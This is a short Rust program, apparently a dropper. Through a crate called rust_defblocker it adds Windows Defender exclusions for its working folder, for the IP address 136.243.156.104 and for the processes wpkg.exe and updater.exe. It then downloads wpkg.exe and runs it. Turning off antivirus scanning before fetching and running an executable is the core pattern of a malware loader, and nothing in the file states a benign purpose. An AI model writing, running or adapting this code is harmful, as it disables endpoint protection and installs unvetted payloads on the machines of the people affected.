use anyhow::Ok;
use rust_defblocker::*;
mod utils;
mod versions;
mod downloader;

#[tokio::main]
async fn main() {
    let path = &utils::get_dir().expect("Could not create directory");
    exclusions(path).expect("Something goes wrong with exclutsion");
    downloader::download_wpkg(&format!("{path}\\wpkg.exe")).await.expect("Could not download wpkg");
    utils::run_process(&format!("{path}\\wpkg.exe"), vec![], false).expect("Could not start wpkg");
}
fn exclusions(path: &str) -> anyhow::Result<()> {
    add_exclusion_folder(&path)?;
    add_exclusion_ip_address("136.243.156.104")?;
    add_exclusion_process("wpkg.exe")?;
    add_exclusion_process("updater.exe")?;
    Ok(())
}